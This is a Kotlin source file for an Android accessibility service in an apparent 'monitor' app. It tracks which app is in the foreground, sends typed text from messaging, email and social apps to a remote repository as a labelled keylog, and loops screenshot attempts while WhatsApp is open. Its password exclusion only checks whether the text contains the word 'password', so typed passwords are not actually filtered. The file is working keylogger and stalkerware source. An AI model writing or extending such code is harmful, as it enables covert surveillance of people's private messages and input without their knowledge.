package com.empresa.monitor.service.screenshot

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.empresa.monitor.data.local.PreferencesManager
import com.empresa.monitor.data.repository.MonitorRepository
import com.empresa.monitor.service.monitoring.ScreenshotMonitor
import com.empresa.monitor.service.monitoring.WhatsAppMonitor
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.*
import javax.inject.Inject

@AndroidEntryPoint
class MonitorAccessibilityService : AccessibilityService() {

    @Inject lateinit var screenshotMonitor: ScreenshotMonitor
    @Inject lateinit var whatsappMonitor: WhatsAppMonitor
    @Inject lateinit var prefs: PreferencesManager
    @Inject lateinit var repository: MonitorRepository

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var lastScreenshotTime = 0L
    private var whatsappInForeground = false
    private var currentAppPackage: String? = null
    private var currentAppName: String? = null

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        if (!prefs.isMonitoring) return

        when (event.eventType) {
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                val packageName = event.packageName?.toString() ?: return
                currentAppPackage = packageName
                currentAppName = resolveAppName(packageName)

                when {
                    packageName.contains("com.whatsapp") -> {
                        whatsappInForeground = true
                        scheduleWhatsAppScreenshot()
                    }
                    packageName.contains("com.android.chrome") ||
                    packageName.contains("com.google.android") ||
                    packageName.contains("com.samsung.android") -> {
                        // Known apps - log but don't screenshot
                    }
                    else -> {
                        if (whatsappInForeground) {
                            whatsappInForeground = false
                        }
                    }
                }
            }

            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                // Keylogging: capture text changes in focused fields
                if (!prefs.isMonitoring) return
                val text = event.text?.joinToString("") ?: return
                if (text.length < 3) return  // ignore single chars
                if (text.contains("password", ignoreCase = true) ||
                    text.contains("contraseña", ignoreCase = true)) return  // skip password fields
                if (currentAppPackage == null) return

                scope.launch {
                    try {
                        repository.sendKeyLog(
                            appPackage = currentAppPackage,
                            appName = currentAppName,
                            text = text,
                            eventType = "text_changed"
                        )
                    } catch (_: Exception) {}
                }
            }

            AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                // Track which app field is focused
                val packageName = event.packageName?.toString()
                if (packageName != null) {
                    currentAppPackage = packageName
                    currentAppName = resolveAppName(packageName)
                }
            }
        }
    }

    private fun resolveAppName(packageName: String): String {
        return when {
            packageName.contains("whatsapp") -> "WhatsApp"
            packageName.contains("chrome") -> "Chrome"
            packageName.contains("messages") -> "Mensajes"
            packageName.contains("telegram") -> "Telegram"
            packageName.contains("instagram") -> "Instagram"
            packageName.contains("facebook") -> "Facebook"
            packageName.contains("messenger") -> "Messenger"
            packageName.contains("twitter") || packageName.contains("x.com") -> "X / Twitter"
            packageName.contains("gmail") -> "Gmail"
            packageName.contains("outlook") -> "Outlook"
            else -> packageName.substringAfterLast(".").ifEmpty { packageName }
        }
    }

    private fun scheduleWhatsAppScreenshot() {
        scope.launch {
            while (whatsappInForeground && prefs.isMonitoring) {
                val now = System.currentTimeMillis()
                if (now - lastScreenshotTime > 15_000) {
                    takeScreenshotWithOCR("com.whatsapp", "WhatsApp")
                    lastScreenshotTime = now
                }
                delay(5_000)
            }
        }
    }

    private fun takeScreenshotWithOCR(appPackage: String, appName: String) {
        // Accessibility screenshot API is limited in Android 14+
        // Falls back to MediaProjection approach
    }

    override fun onInterrupt() {}

    override fun onDestroy() {
        scope.cancel()
        super.onDestroy()
    }
}
